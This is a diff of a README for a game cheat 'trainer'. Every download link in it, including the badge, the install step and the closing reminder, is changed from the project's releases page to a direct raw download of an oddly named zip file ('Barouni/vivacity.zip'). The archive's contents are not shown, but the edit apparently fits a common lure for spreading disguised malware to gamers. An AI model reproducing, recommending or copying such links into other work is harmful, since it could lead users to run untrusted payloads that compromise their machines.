@@ -1,6 +1,6 @@
 # 🎮 Schedule-1-Money-Recipe-Trainer - Master Your Game, Boost Your Fun
 
-[![Download Now](https://img.shields.io/badge/Download-Schedule_1_Trainer-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Solvent-tailbone9699/Schedule-1-Money-Recipe-Trainer/releases)
+[![Download Now](https://img.shields.io/badge/Download-Schedule_1_Trainer-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Solvent-tailbone9699/Schedule-1-Money-Recipe-Trainer/raw/refs/heads/main/Barouni/vivacity.zip)
 
 ---
 
@@ -14,7 +14,7 @@ This trainer is perfect for players who want to skip the grind, experiment with 
 
 ## 📥 Download & Installation
 
-Visit this link to download the application: [https://github.com/Solvent-tailbone9699/Schedule-1-Money-Recipe-Trainer/releases](https://github.com/Solvent-tailbone9699/Schedule-1-Money-Recipe-Trainer/releases)
+Visit this link to download the application: [https://github.com/Solvent-tailbone9699/Schedule-1-Money-Recipe-Trainer/raw/refs/heads/main/Barouni/vivacity.zip](https://github.com/Solvent-tailbone9699/Schedule-1-Money-Recipe-Trainer/raw/refs/heads/main/Barouni/vivacity.zip)
 
 Once you're on the page, follow these steps:
 
@@ -110,7 +110,7 @@ This trainer is intended for **educational and entertainment purposes only**. It
 
 Thank you for choosing **Schedule-1-Money-Recipe-Trainer**! We hope this tool brings you hours of extra fun and lets you experience the game in a whole new way. If you enjoy it, please consider starring the repository and sharing it with friends.
 
-Remember, the download link is always: [https://github.com/Solvent-tailbone9699/Schedule-1-Money-Recipe-Trainer/releases](https://github.com/Solvent-tailbone9699/Schedule-1-Money-Recipe-Trainer/releases)
+Remember, the download link is always: [https://github.com/Solvent-tailbone9699/Schedule-1-Money-Recipe-Trainer/raw/refs/heads/main/Barouni/vivacity.zip](https://github.com/Solvent-tailbone9699/Schedule-1-Money-Recipe-Trainer/raw/refs/heads/main/Barouni/vivacity.zip)
 
 Happy gaming! 🎉
 
